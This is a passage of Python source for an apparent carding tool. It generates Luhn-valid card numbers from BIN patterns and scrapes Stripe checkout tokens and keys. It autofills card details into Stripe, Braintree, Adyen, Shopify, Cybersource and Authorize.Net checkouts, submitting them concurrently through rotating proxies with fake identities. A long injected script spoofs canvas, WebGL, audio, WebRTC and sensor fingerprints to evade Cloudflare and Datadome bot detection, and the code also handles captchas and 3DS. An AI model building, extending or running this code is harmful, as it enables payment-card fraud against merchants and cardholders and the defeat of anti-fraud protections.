        parts = bin_pattern.split('|')
        bin_clean = re.sub(r'[^0-9xX]','',parts[0])
        is_amex = bin_clean.startswith(('34','37'))
        target_len = 15 if is_amex else 16
        cvv_len = 4 if is_amex else 3
        card = ''
        for c in bin_clean:
            card += str(random.randint(0,9)) if c.lower()=='x' else c
        remaining = target_len - len(card) - 1
        for _ in range(remaining): card += str(random.randint(0,9))
        for i in range(10):
            if CardGenerator.luhn(card+str(i))==0:
                full_card = card+str(i)
                break
        else: full_card = card+'0'
        if len(full_card) != target_len: full_card = full_card.ljust(target_len,'0')
        month = parts[1].zfill(2) if len(parts)>1 and parts[1].lower()!='xx' else f"{random.randint(1,12):02d}"
        year = parts[2].zfill(2) if len(parts)>2 and parts[2].lower()!='xx' else f"{datetime.now().year+random.randint(1,5):02d}"
        cvv = parts[3] if len(parts)>3 and parts[3].lower() not in ('xxx','xxxx') else ''.join(str(random.randint(0,9)) for _ in range(cvv_len))
        return {'card':full_card, 'month':month, 'year':year, 'cvv':cvv}

class StripeAPIExtractor:
    @staticmethod
    def extract_cs_live(url: str, html: str) -> Optional[str]:
        patterns = [r'/c/pay/(cs_[a-z]+_[a-zA-Z0-9]+)', r'/payment_pages/(cs_[a-z]+_[a-zA-Z0-9]+)', r'cs_[a-z]+_[a-zA-Z0-9]+']
        for pattern in patterns:
            match = re.search(pattern, url)
            if match: return match.group(1) if '(' in pattern else match.group(0)
        match = re.search(r'cs_[a-z]+_[a-zA-Z0-9]+', html)
        return match.group(0) if match else None
    
    @staticmethod
    def extract_pk_live(html: str) -> Optional[str]:
        match = re.search(r'pk_live_[a-zA-Z0-9]+', html)
        return match.group(0) if match else None
        
    @staticmethod
    def is_invoice_page(url: str) -> bool:
        return 'invoice.stripe.com' in url.lower()
        
    @staticmethod
    async def extract_invoice_amount(page: Page) -> Optional[str]:
        try:
            return await page.evaluate('''() => {
                const amountEl = document.querySelector('[data-testid="invoice-amount-due"], .AmountDue');
                if (!amountEl) return null;
                return amountEl.innerText;
            }''')
        except: return None

    @staticmethod
    async def fetch_payment_data(cs_token: str, pk_key: str) -> Dict:
        pass

# ============= AUTOFILL ENGINES =============
class StripeV1_NormalForm(BaseAutofill):
    async def fill(self):
        await self.fill_email(self.email)
        await self.fill_card_number(self.masked_card)
        await self.fill_expiry(self.masked_expiry)
        await self.fill_cvv(self.masked_cvv)
        await self.fill_name(self.name)
        await self.fill_address(self.address['line1'])
        await self.fill_zip(self.address['zip'])
        await asyncio.sleep(1)

class StripeV2_ElementsIframe(BaseAutofill):
    async def fill(self):
        await self.click_card_tab()
        
        # 1% CODER: Multi-Iframe Filling Protocol
        # Stripe can use 1 iframe for everything OR 3 separate iframes for Card, Expiry, and CVC.
        # We must scan ALL Stripe iframes to ensure we don't miss fields.
        iframes = await self.page.query_selector_all('iframe')
        for iframe_element in iframes:
            try:
                src = await iframe_element.get_attribute('src') or ''
                name = await iframe_element.get_attribute('name') or ''
                if 'stripe.com' in src or '__privateStripeFrame' in name or 'stripe' in name.lower():
                    frame = await iframe_element.content_frame()
                    if not frame: continue
                    
                    ci = await frame.query_selector('input[placeholder*="card number"], input[autocomplete="cc-number"], input[name="cardnumber"]')
                    if ci and await ci.is_visible(): await self.human_type(ci, self.masked_card)
                    
                    ei = await frame.query_selector('input[placeholder*="MM/YY"], input[autocomplete="cc-exp"], input[name="exp-date"]')
                    if ei and await ei.is_visible(): await self.human_type(ei, self.masked_expiry)
                    
                    cvi = await frame.query_selector('input[placeholder*="CVC"], input[autocomplete="cc-csc"], input[name="cvc"]')
                    if cvi and await cvi.is_visible(): await self.human_type(cvi, self.masked_cvv)
                    
                    # Some Elements also require Zip inside the iframe
                    zi = await frame.query_selector('input[placeholder*="ZIP"], input[autocomplete="postal-code"]')
                    if zi and await zi.is_visible(): await self.human_type(zi, self.address['zip'])
            except: pass
            
        await self.fill_name(self.name)
        await self.fill_email(self.email)
        await self.fill_address(self.address['line1'])
        await self.fill_city(self.address['city'])
        await self.fill_zip(self.address['zip'])
        await self.fill_country(self.address['country'])
        await asyncio.sleep(1)

class StripeV3_Modal(BaseAutofill):
    async def fill(self):
        modal = await self.page.query_selector('[role="dialog"], [class*="modal"], [class*="Modal"]')
        if not modal: return await StripeV2_ElementsIframe(self.page, self.card, self.name, self.email, self.address).fill()
        ci = await modal.query_selector('#cardNumber, [name="cardNumber"], input[placeholder*="card number"]')
        if ci: await self.human_type(ci, self.masked_card)
        ei = await modal.query_selector('#cardExpiry, [name="cardExpiry"], input[placeholder*="MM/YY"]')
        if ei: await self.human_type(ei, self.masked_expiry)
        cvi = await modal.query_selector('#cardCvc, [name="cardCvc"], input[placeholder*="CVC"]')
        if cvi: await self.human_type(cvi, self.masked_cvv)
        await self.fill_name(self.name)
        await self.fill_email(self.email)
        await self.fill_address(self.address['line1'])
        await self.fill_city(self.address['city'])
        await self.fill_zip(self.address['zip'])
        await self.fill_country(self.address['country'])
        await asyncio.sleep(1)

class StripeV3_Checkout(BaseAutofill):
    async def fill(self):
        await self.fill_email(self.email)
        await self.click_card_tab()
        await self.fill_card_number(self.masked_card)
        await self.fill_expiry(self.masked_expiry)
        await self.fill_cvv(self.masked_cvv)
        await self.fill_name(self.name)
        await self.fill_address(self.address['line1'])
        await self.fill_city(self.address['city'])
        await self.fill_zip(self.address['zip'])
        await self.fill_country(self.address['country'])
        await asyncio.sleep(1)

class StripeV4_Invoice(BaseAutofill):
    async def fill(self):
        cs = await self.page.query_selector('button:has-text("Card"), [class*="Card"][class*="Section"]')
        if cs:
            await self.cursor.click(cs)
            await asyncio.sleep(1)
        iframes = await self.page.query_selector_all('iframe')
        for iframe in iframes:
            try:
                f = await iframe.content_frame()
                if f:
                    ci = await f.query_selector('input[placeholder*="card number"], input[autocomplete="cc-number"]')
                    if ci: await self.human_type(ci, self.masked_card)
                    ei = await f.query_selector('input[placeholder*="MM/YY"], input[autocomplete="cc-exp"]')
                    if ei: await self.human_type(ei, self.masked_expiry)
                    cvi = await f.query_selector('input[placeholder*="CVC"], input[autocomplete="cc-csc"]')
                    if cvi: await self.human_type(cvi, self.masked_cvv)
            except: pass
        await self.fill_name(self.name)
        await self.fill_email(self.email)
        await self.fill_address(self.address['line1'])
        await self.fill_city(self.address['city'])
        await self.fill_zip(self.address['zip'])
        await self.fill_country(self.address['country'])
        await asyncio.sleep(1)

class StripeV5_Embedded(BaseAutofill):
    async def fill(self):
        elements = await self.page.query_selector_all('[class*="StripeElement"], [class*="CardElement"]')
        for el in elements:
            try: await self.cursor.click(el)
            except: pass
        iframes = await self.page.query_selector_all('iframe')
        for iframe in iframes:
            try:
                f = await iframe.content_frame()
                if f:
                    ci = await f.query_selector('input[placeholder*="card number"]')
                    if ci: await self.human_type(ci, self.masked_card)
                    ei = await f.query_selector('input[placeholder*="MM/YY"]')
                    if ei: await self.human_type(ei, self.masked_expiry)
                    cvi = await f.query_selector('input[placeholder*="CVC"]')
                    if cvi: await self.human_type(cvi, self.masked_cvv)
            except: pass
        await self.fill_name(self.name)
        await self.fill_email(self.email)
        await self.fill_address(self.address['line1'])
        await self.fill_city(self.address['city'])
        await self.fill_zip(self.address['zip'])
        await self.fill_country(self.address['country'])
        await asyncio.sleep(1)

class StripeV6_PaymentElement(BaseAutofill):
    async def fill(self):
        iframes = await self.page.query_selector_all('iframe')
        for iframe in iframes:
            try:
                f = await iframe.content_frame()
                if f:
                    ci = await f.query_selector('input[placeholder*="card number"], input[autocomplete="cc-number"]')
                    if ci: await self.human_type(ci, self.masked_card)
                    ei = await f.query_selector('input[placeholder*="MM/YY"], input[autocomplete="cc-exp"]')
                    if ei: await self.human_type(ei, self.masked_expiry)
                    cvi = await f.query_selector('input[placeholder*="CVC"], input[autocomplete="cc-csc"]')
                    if cvi: await self.human_type(cvi, self.masked_cvv)
            except: pass
        await self.fill_name(self.name)
        await self.fill_email(self.email)
        await self.fill_address(self.address['line1'])
        await self.fill_city(self.address['city'])
        await self.fill_zip(self.address['zip'])
        await self.fill_country(self.address['country'])
        await asyncio.sleep(1)

class StripeV7_LinkAuth(BaseAutofill):
    async def fill(self):
        await StripeV2_ElementsIframe(self.page, self.card, self.name, self.email, self.address).fill()
        link = await self.page.query_selector('button:has-text("Link"), [data-testid="link-auth"]')
        if link:
            await link.click()
            await asyncio.sleep(1)
            await self.fill_email(self.email)
            submit = await self.page.query_selector('button[type="submit"]')
            if submit: await submit.click()
        await asyncio.sleep(0.5)

# ============= NEW GATEWAY ENGINES =============
class Braintree_HostedFields(BaseAutofill):
    async def fill(self):
        iframes = await self.page.query_selector_all('iframe[name*="braintree"]')
        for iframe in iframes:
            try:
                f = await iframe.content_frame()
                if f:
                    ci = await f.query_selector('#credit-card-number')
                    if ci: await self.human_type(ci, self.masked_card)
                    ei = await f.query_selector('#expiration')
                    if ei: await self.human_type(ei, self.masked_expiry)
                    cvi = await f.query_selector('#cvv')
                    if cvi: await self.human_type(cvi, self.masked_cvv)
            except: pass
        await self.fill_name(self.name)
        await self.fill_email(self.email)
        await self.fill_address(self.address['line1'])
        await self.fill_zip(self.address['zip'])
        await asyncio.sleep(1)

class Adyen_DropIn(BaseAutofill):
    async def fill(self):
        ci = await self.page.query_selector('.adyen-checkout__card__cardNumber__input')
        if ci: await self.human_type(ci, self.masked_card)
        ei = await self.page.query_selector('.adyen-checkout__card__exp-date__input')
        if ei: await self.human_type(ei, self.masked_expiry)
        cvi = await self.page.query_selector('.adyen-checkout__card__cvc__input')
        if cvi: await self.human_type(cvi, self.masked_cvv)
        await self.fill_name(self.name)
        await asyncio.sleep(1)

class Shopify_Checkout(BaseAutofill):
    async def fill(self):
        await self.fill_email(self.email)
        await self.fill_name(self.name)
        await self.fill_address(self.address['line1'])
        await self.fill_city(self.address['city'])
        await self.fill_zip(self.address['zip'])
        
        # Shopify specific deep iframes
        iframes = await self.page.query_selector_all('iframe[id*="card-fields"]')
        for iframe in iframes:
            try:
                f = await iframe.content_frame()
                if f:
                    ci = await f.query_selector('#number')
                    if ci: await self.human_type(ci, self.masked_card)
                    ei = await f.query_selector('#expiry')
                    if ei: await self.human_type(ei, self.masked_expiry)
                    cvi = await f.query_selector('#verification_value')
                    if cvi: await self.human_type(cvi, self.masked_cvv)
            except: pass
        await asyncio.sleep(1)

class Cybersource_Microform(BaseAutofill):
    async def fill(self):
        await self.fill_name(self.name)
        iframes = await self.page.query_selector_all('iframe[id*="flex-microform"]')
        for iframe in iframes:
            try:
                f = await iframe.content_frame()
                if f:
                    ci = await f.query_selector('#cardNumber')
                    if ci: await self.human_type(ci, self.masked_card)
                    cvi = await f.query_selector('#securityCode')
                    if cvi: await self.human_type(cvi, self.masked_cvv)
            except: pass
        await self.fill_expiry(self.masked_expiry)
        await self.fill_address(self.address['line1'])
        await self.fill_zip(self.address['zip'])
        await asyncio.sleep(1)

class AuthorizeNet_AcceptJS(BaseAutofill):
    async def fill(self):
        await self.fill_card_number(self.masked_card)
        await self.fill_expiry(self.masked_expiry)
        await self.fill_cvv(self.masked_cvv)
        await self.fill_name(self.name)
        await self.fill_email(self.email)
        await self.fill_address(self.address['line1'])
        await self.fill_zip(self.address['zip'])
        await asyncio.sleep(1)

class AutofillSelector:
    @staticmethod
    async def detect(page: Page, url: str):
        url_lower = url.lower()
        if 'invoice.stripe.com' in url_lower: return StripeV4_Invoice
        if 'shopify.com' in url_lower or await page.query_selector('.step__sections') or await page.query_selector('[data-trekkie-id]'): return Shopify_Checkout
        if await page.query_selector('iframe[name*="braintree"]'): return Braintree_HostedFields
        if await page.query_selector('.adyen-checkout__card__cardNumber__input') or await page.query_selector('.adyen-checkout'): return Adyen_DropIn
        if await page.query_selector('iframe[id*="flex-microform"]'): return Cybersource_Microform
        if await page.query_selector('input[data-accept="cardNumber"]') or await page.query_selector('#AcceptJS'): return AuthorizeNet_AcceptJS
        
        if await page.query_selector('[class*="PaymentElement"]'): return StripeV6_PaymentElement
        if await page.query_selector('button:has-text("Link")'): return StripeV7_LinkAuth
        if await page.query_selector('[role="dialog"]'): return StripeV3_Modal
        if await page.query_selector('iframe[name*="__privateStripeFrame"]'): return StripeV2_ElementsIframe
        if await page.query_selector('[class*="StripeElement"]'): return StripeV5_Embedded
        if await page.query_selector('#cardNumber, [name="cardNumber"]'): return StripeV1_NormalForm
        return StripeV2_ElementsIframe

class URLAnalyzer:
    @staticmethod
    async def analyze(user_id: int, page: Page, url: str) -> Dict:
        result = {'merchant': 'Unknown', 'amount': None, 'cs_token': None, 'pk_key': None}
        try:
            html = await page.content()
            cs_token = StripeAPIExtractor.extract_cs_live(url, html)
            pk_key = StripeAPIExtractor.extract_pk_live(html)
            result['cs_token'] = cs_token
            result['pk_key'] = pk_key
            
            if StripeAPIExtractor.is_invoice_page(url):
                invoice_amount = await StripeAPIExtractor.extract_invoice_amount(page)
                if invoice_amount:
                    result['amount'] = invoice_amount
                    from urllib.parse import urlparse
                    parsed = urlparse(url)
                    hostname = parsed.netloc.replace('invoice.stripe.com', '').replace('www.', '').split('.')[0]
                    if hostname: result['merchant'] = hostname.capitalize() if hostname else "Invoice"
                    return result
            
            if cs_token and pk_key:
                api_data = await StripeAPIExtractor.fetch_payment_data(user_id, cs_token, pk_key)
                if api_data.get('success'):
                    result['amount'] = api_data.get('amount')
                    result['merchant'] = api_data.get('merchant')
                    return result
            
            # 1% CODER: Setup Intent Detection (Zero-Auth Trials)
            if 'seti_' in url or 'setup_intent' in url or 'seti_' in html:
                result['amount'] = "Setup Intent ($0.00)"
                
            merchant = await page.evaluate('''() => {
                const m = document.querySelector('meta[property="og:site_name"]');
                return m ? m.content : document.title.split(' | ')[0];
            }''')
            if merchant: result['merchant'] = merchant.strip()
            
            if not result['amount']:
                amount = await page.evaluate('''() => {
                    const el = document.querySelector('.price, .amount, [data-amount], #total, .total, .order-summary, .Text-color--default.Text-fontSize--16.Text-fontWeight--500');
                    return el ? (el.innerText || el.getAttribute('data-amount')) : null;
                }''')
                if amount:
                    clean = amount.strip()
                    # 1% CODER: Multi-currency text parsing (e.g. "$2.38 - 236 rs")
                    # We specifically look for the dollar amount first to prevent grabbing the wrong currency
                    usd_match = re.search(r'\$\s*([\d,]+\.?\d*)', clean)
                    if usd_match:
                        val = usd_match.group(1).replace(',', '')
                        result['amount'] = f"${val}"
                    elif len(clean) < 25:
                        result['amount'] = clean
                    else:
                        m = re.search(r'[\$€£]?\s*([\d,]+\.?\d*)', clean)
                        if m:
                            val = m.group(1).replace(',', '')
                            if '.' in val: result['amount'] = f"${val}"
                            else: result['amount'] = f"${int(val)/100:.2f}"
        except: pass
        return result
HARDWARE_SPOOF_SCRIPT = """
    Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
    window.chrome={runtime:{}};
    
    // 1% CODER: Emulate Modern Flagship Mobile Hardware Capabilities
    Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 }); // Octa-core CPU
    Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 }); // 8GB RAM
    Object.defineProperty(navigator, 'maxTouchPoints', { get: () => 5 }); // 5-finger multi-touch
    
    // Emulate Battery
    navigator.getBattery = async () => ({
        charging: false,
        chargingTime: Infinity,
        dischargingTime: 8400,
        level: 0.85 + (Math.random() * 0.1),
        addEventListener: () => {}
    });
    
    // Emulate Gyroscope/Accelerometer permission
    navigator.permissions.query = new Proxy(navigator.permissions.query, {
        apply: async (target, thisArg, args) => {
            if (args[0].name === 'accelerometer' || args[0].name === 'gyroscope') {
                return { state: 'granted', onchange: null };
            }
            return Reflect.apply(target, thisArg, args);
        }
    });
    
    // Simulating natural device vibration API
    navigator.vibrate = (pattern) => true;
    
    // Spoofing Gyroscope movement (simulates a human holding a phone)
    setInterval(() => {
        try {
            const motionEvent = new Event('devicemotion');
            motionEvent.acceleration = { x: Math.random() * 0.01, y: Math.random() * 0.01, z: 9.81 + (Math.random() * 0.01) };
            motionEvent.rotationRate = { alpha: Math.random() * 0.1, beta: Math.random() * 0.1, gamma: Math.random() * 0.1 };
            window.dispatchEvent(motionEvent);
        } catch(e) {}
    }, 50);
    
    // 1% CODER: Exact Viewport/Screen Synchronization
    Object.defineProperty(window.screen, 'colorDepth', { get: () => 32 });
    Object.defineProperty(window.screen, 'pixelDepth', { get: () => 32 });
    Object.defineProperty(window.screen, 'width', { get: () => 390 });
    Object.defineProperty(window.screen, 'height', { get: () => 844 });
    Object.defineProperty(window.screen, 'availWidth', { get: () => 390 });
    Object.defineProperty(window.screen, 'availHeight', { get: () => 844 });
    Object.defineProperty(window, 'outerWidth', { get: () => 390 });
    Object.defineProperty(window, 'outerHeight', { get: () => 844 });
    
    // 1% CODER: Block WebRTC IP Leaks (Silent Bypass)
    Object.defineProperty(navigator, 'mediaDevices', { value: undefined, configurable: false, writable: false });
    const FakeRTC = function() {
        this.createDataChannel = () => ({});
        this.createOffer = () => Promise.resolve({ sdp: '', type: 'offer' });
        this.setLocalDescription = () => Promise.resolve();
        this.close = () => {};
        this.addEventListener = () => {};
        this.localDescription = { sdp: '' };
        this.iceConnectionState = 'new';
    };
    window.RTCPeerConnection = FakeRTC;
    window.webkitRTCPeerConnection = FakeRTC;
    
    // 1% CODER: Canvas Fingerprint Poisoning (Cloudflare/Datadome bypass)
    const originalGetContext = HTMLCanvasElement.prototype.getContext;
    HTMLCanvasElement.prototype.getContext = function(type, ...args) {
        const context = originalGetContext.apply(this, [type, ...args]);
        if (type === '2d') {
            const originalFillText = context.fillText;
            context.fillText = function(...args) {
                args[1] += (Math.random() - 0.5) * 0.02; // Subpixel noise
                return originalFillText.apply(this, args);
            };
            const originalGetImageData = context.getImageData;
            context.getImageData = function(...args) {
                const imageData = originalGetImageData.apply(this, args);
                // Math noise on 5 random pixels completely mutates SHA-256 fingerprint hash
                for(let i=0; i<5; i++) {
                    const idx = Math.floor(Math.random() * (imageData.data.length / 4)) * 4;
                    imageData.data[idx] = (imageData.data[idx] + 1) % 255;
                }
                return imageData;
            };
            
            // 1% CODER: Font Metric Poisoning (measureText)
            // Bots measure text width to the thousandth decimal to fingerprint OS font smoothing engines.
            // We inject 0.0001% variance to spoof a unique subpixel rendering engine.
            const originalMeasureText = context.measureText;
            context.measureText = function(...args) {
                const metrics = originalMeasureText.apply(this, args);
                if (metrics && metrics.width) {
                    Object.defineProperty(metrics, 'width', {
                        value: metrics.width + (Math.random() - 0.5) * 0.001,
                        configurable: true
                    });
                }
                return metrics;
            };
        }
        return context;
    };
    
    // 1% CODER: DOM ClientRect GPU Fractional Anti-Aliasing Spoofing
    // Headless browsers return perfectly round integers (e.g. 50.000) for element positions.
    // Real GPUs render with fractional anti-aliasing (e.g. 50.012). We inject this variance.
    const originalGetBoundingClientRect = Element.prototype.getBoundingClientRect;
    Element.prototype.getBoundingClientRect = function() {
        const rect = originalGetBoundingClientRect.apply(this);
        if(!rect) return rect;
        const randomize = (val) => val + (Math.random() - 0.5) * 0.005;
        return {
            x: randomize(rect.x),
            y: randomize(rect.y),
            width: randomize(rect.width),
            height: randomize(rect.height),
            top: randomize(rect.top),
            right: randomize(rect.right),
            bottom: randomize(rect.bottom),
            left: randomize(rect.left)
        };
    };
    
    // 1% CODER: WebGL GPU Vendor & Renderer Spoofing
    const getParameterProxy = function (original) {
        return function (parameter) {
            // UNMASKED_VENDOR_WEBGL = 37445
            if (parameter === 37445) {
                return 'Qualcomm'; // Mobile GPU Vendor
            }
            // UNMASKED_RENDERER_WEBGL = 37446
            if (parameter === 37446) {
                return 'Adreno (TM) 740'; // Samsung Galaxy S23 Ultra GPU
            }
            return original.apply(this, [parameter]);
        };
    };
    const webgl1 = WebGLRenderingContext.prototype.getParameter;
    WebGLRenderingContext.prototype.getParameter = getParameterProxy(webgl1);
    const webgl2 = WebGL2RenderingContext.prototype.getParameter;
    WebGL2RenderingContext.prototype.getParameter = getParameterProxy(webgl2);
    
    // 1% CODER: Audio Fingerprint Poisoning (Datadome hardware unmasking bypass)
    const audioMethods = ['createOscillator', 'createDynamicsCompressor', 'createBiquadFilter'];
    const fakeAudioContext = function(TargetContext) {
        if (!TargetContext) return;
        audioMethods.forEach(method => {
            if (TargetContext.prototype[method]) {
                const originalMethod = TargetContext.prototype[method];
                TargetContext.prototype[method] = function(...args) {
                    const node = originalMethod.apply(this, args);
                    if (method === 'createOscillator') {
                        node.type = 'triangle'; // Poison the wave shape
                        const originalStart = node.start;
                        node.start = function(...sArgs) {
                            // Introduce random frequency variance (+/- 0.05 Hz) to mutate audio SHA hash
                            if(this.frequency) {
                                this.frequency.value += (Math.random() - 0.5) * 0.1;
                            }
                            return originalStart.apply(this, sArgs);
                        };
                    }
                    return node;
                };
            }
        });
    };
    fakeAudioContext(window.OfflineAudioContext);
    fakeAudioContext(window.AudioContext);
    fakeAudioContext(window.webkitOfflineAudioContext);
    fakeAudioContext(window.webkitAudioContext);
"""

async def single_hit(browser, url: str, card: Dict, attempt: int, autofill_class, url_info, user_id: int) -> Dict:
    start = time.time()
    result = {'attempt': attempt, 'card': card, 'success': False, 'decline_code': None, 'response_time': 0, 'amount': url_info.get('amount'), 'proxy_raw': None}
    context = None
    try:
        # 1% CODER: Ephemeral Context per hit prevents fingerprint bleed
        proxy_data = await ProxyManager.get_random(user_id)
        playwright_proxy = None
        if proxy_data:
            result['proxy_raw'] = proxy_data['raw']
            playwright_proxy = {"server": proxy_data["server"]}
            if "username" in proxy_data:
                playwright_proxy["username"] = proxy_data["username"]
                playwright_proxy["password"] = proxy_data["password"]

        # Identify checkout type and inject pre-generated identity
        proxy_url_str = proxy_data["server"] if proxy_data else None
        address, proxy_timezone, proxy_locale = await RandomData.get_address_and_timezone(proxy_url_str)
        name = RandomData.get_name()
        email = RandomData.get_email()
        
        # 1% CODER: Mobile Hardware Emulation, Dynamic Locale & Sec-CH-UA Spoofing
        # We enforce Android Chromium since the Playwright engine IS Chromium. 
        # Spoofing iPhone Safari while sending Chromium Sec-CH-UA headers is an instant flag!
        ua = "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
        
        context = await browser.new_context(
            user_agent=ua,
            extra_http_headers={
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"'
            },
            viewport={'width':390,'height':844},
            device_scale_factor=3,
            is_mobile=True,
            has_touch=True,
            ignore_https_errors=True,
            locale=proxy_locale,
            timezone_id=proxy_timezone,
            proxy=playwright_proxy
        )
        
        # SPEED OPTIMIZATION: Block heavy assets (BUT keep fonts for anti-fingerprinting)
        async def block_assets(route):
            if route.request.resource_type in ["image", "media"]:
                await route.abort()
            else:
                await route.continue_()
        await context.route("**/*", block_assets)
        
        page = await context.new_page()
        await Stealth().apply_stealth_async(page)
        
        # Inject Hardware Sensor Emulation, WebRTC Blocker, and Canvas Poisoning
        await page.add_init_script(HARDWARE_SPOOF_SCRIPT)
        
        await page.goto(url, timeout=30000, wait_until='domcontentloaded')
        await asyncio.sleep(0.5) # Let frame settle
        
        autofill = autofill_class(page, card, name, email, address)
        await autofill.enable_card_replace(card)
        await autofill.solve_captcha()
        await autofill.fill()
        
        # 1% CODER: Human Transition Delay
        # Simulate the physical time it takes a human finger to move from the keyboard (CVV) 
        # to the submit button on a mobile screen.
        await asyncio.sleep(random.uniform(0.3, 0.9))
        
        if not await autofill.click_submit():
            result['error'] = 'Submit button not found'
            result['decline_code'] = 'submit_button_not_found'
            return result
        if await autofill.detect_3ds():
            await autofill.handle_3ds()
            
        response = await autofill.get_result()
        result['response_time'] = time.time() - start
        result['success'] = response.get('success', False)
        result['decline_code'] = response.get('decline_code')
        if response.get('amount'):
            result['amount'] = response.get('amount')
        if response.get('final_url'):
            result['final_url'] = response.get('final_url')
    except Exception as e:
        result['error'] = str(e)
        result['decline_code'] = 'exception'
        result['response_time'] = time.time() - start
    finally:
        if context: await context.close() # Destroy ephemeral context
    return result

class ConcurrentHitter:
    def __init__(self, user_id: int, url: str, cards: List[Dict], update_callback=None):
        self.user_id = user_id
        self.url = url
        self.cards = cards
        self.successes = 0
        self.fails = 0
        self.completed = 0
        self.total = len(cards[:MAX_ATTEMPTS])
        self.url_info = None
        self.update_callback = update_callback
        self.is_running = True
        
    async def analyze_first(self):
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True, args=['--disable-blink-features=AutomationControlled','--no-sandbox','--disable-dev-shm-usage','--disable-web-security','--disable-site-isolation-trials'])
            
            max_retries = 3
            for attempt in range(max_retries):
                try:
                    proxy_data = await ProxyManager.get_random(self.user_id)
                    playwright_proxy = ProxyManager.format_for_playwright(proxy_data) if proxy_data else None
                    
                    # Dynamic Timezone mapping
                    proxy_url_str = proxy_data["server"] if proxy_data else None
                    _, proxy_timezone, proxy_locale = await RandomData.get_address_and_timezone(proxy_url_str)
                    
                    ua = random.choice(USER_AGENTS)
                    platform = '"Windows"' if 'Windows' in ua else '"macOS"'
                    
                    context = await browser.new_context(
                        user_agent=ua, 
                        extra_http_headers={
                            'sec-ch-ua-platform': platform,
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua': '"Chromium";v="120", "Not(A:Brand";v="24", "Google Chrome";v="120"'
                        },
                        viewport={'width':1920,'height':1080}, 
                        locale=proxy_locale,
                        timezone_id=proxy_timezone,
                        proxy=playwright_proxy
                    )
                    
                    # 1% CODER: Apply Stealth and Hardware spoofing at the Context level BEFORE any page is created
                    await context.add_init_script(HARDWARE_SPOOF_SCRIPT)
                    
                    page = await context.new_page()
                    
                    # 1% CODER: Apply Stealth even to the initial analyzer to avoid Cloudflare taint
                    await Stealth().apply_stealth_async(page)

                    
                    await page.goto(self.url, timeout=30000, wait_until='domcontentloaded')
                    await asyncio.sleep(3)
                    self.url_info = await URLAnalyzer.analyze(self.user_id, page, self.url)
                    await context.close()
                    break # Success!
                except Exception as e:
                    if context: await context.close()
                    if attempt == max_retries - 1:
                        self.url_info = {'amount': None, 'merchant': 'Unknown'} # Fallback
            
            await browser.close()
        return self.url_info

    async def _worker(self, queue: asyncio.Queue, browser, autofill_class):
        while self.is_running:
            try:
                card, attempt_num = queue.get_nowait()
            except asyncio.QueueEmpty:
                break
                
            max_retries = 3 # Increased from 2 to allow for Cloudflare progressive backoff
            for try_idx in range(max_retries):
                result = await single_hit(browser, self.url, card, attempt_num, autofill_class, self.url_info, self.user_id)
                
                # Retry if proxy failed/timeout
                if result.get('decline_code') == 'exception' and ('Timeout' in result.get('error', '') or 'ERR_' in result.get('error', '')):
                    if result.get('proxy_raw'):
                        ProxyManager.remove(result['proxy_raw'])
                        
                    if try_idx < max_retries - 1:
                        # 1% CODER: Exponential Backoff (from claude.py) for rate limit / proxy drops
                        delay = 1.5 * (try_idx + 1)
                        await asyncio.sleep(delay)
                        continue # Try again with a new proxy
                break
            
            self.completed += 1
            if result['success']:
                self.successes += 1
            else:
                self.fails += 1
                
            if self.update_callback:
                await self.update_callback({
                    "status": "progress",
                    "result": result,
                    "completed": self.completed,
                    "total": self.total,
                    "successes": self.successes,
                    "fails": self.fails
                })
            queue.task_done()
    
    async def run(self):
        try:
            if self.update_callback:
                await self.update_callback({"status": "analyzing"})
                
            await self.analyze_first()
            
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True, args=['--disable-blink-features=AutomationControlled','--no-sandbox','--disable-dev-shm-usage','--disable-web-security','--disable-site-isolation-trials'])
                
                max_retries = 3
                autofill_class = StripeV2_ElementsIframe
                for attempt in range(max_retries):
                    context = None
                    try:
                        proxy_data = await ProxyManager.get_random(self.user_id)
                        playwright_proxy = ProxyManager.format_for_playwright(proxy_data) if proxy_data else None
                        
                        proxy_url_str = proxy_data["server"] if proxy_data else None
                        _, proxy_timezone, proxy_locale = await RandomData.get_address_and_timezone(proxy_url_str)
                        
                        ua = random.choice(USER_AGENTS)
                        platform = '"Windows"' if 'Windows' in ua else '"macOS"'
                        
                        context = await browser.new_context(
                            user_agent=ua,
                            extra_http_headers={
                                'sec-ch-ua-platform': platform,
                                'sec-ch-ua-mobile': '?0',
                                'sec-ch-ua': '"Chromium";v="120", "Not(A:Brand";v="24", "Google Chrome";v="120"'
                            },
                            viewport={'width': 390, 'height': 844},
                            device_scale_factor=3,
                            is_mobile=True,
                            has_touch=True,
                            locale=proxy_locale,
                            timezone_id=proxy_timezone,
                            proxy=playwright_proxy
                        )
                        
                        await context.add_init_script(HARDWARE_SPOOF_SCRIPT)
                        test_page = await context.new_page()
                        await Stealth().apply_stealth_async(test_page)
                        
                        await test_page.goto(self.url, timeout=30000, wait_until='domcontentloaded')
                        autofill_class = await AutofillSelector.detect(test_page, self.url)
                        await context.close()
                        break
                    except Exception as e:
                        print(f"DEBUG: run() attempt {attempt} failed: {str(e)}")
                        if context: await context.close()
                        pass
                
                if self.update_callback:
                    await self.update_callback({"status": "starting", "url_info": self.url_info, "autofill": autofill_class.__name__})
                    
                queue = asyncio.Queue()
                for i, card in enumerate(self.cards[:MAX_ATTEMPTS]):
                    queue.put_nowait((card, i + 1))
                    
                workers = []
                for _ in range(CONCURRENT_BATCH_SIZE):
                    workers.append(asyncio.create_task(self._worker(queue, browser, autofill_class)))
                    
                await queue.join()
                
                for w in workers:
                    w.cancel()
                    
                await browser.close()
                
            if self.update_callback:
                await self.update_callback({"status": "completed", "successes": self.successes, "fails": self.fails})
        except Exception as e:
            if self.update_callback:
                await self.update_callback({"status": "error", "error": str(e)})
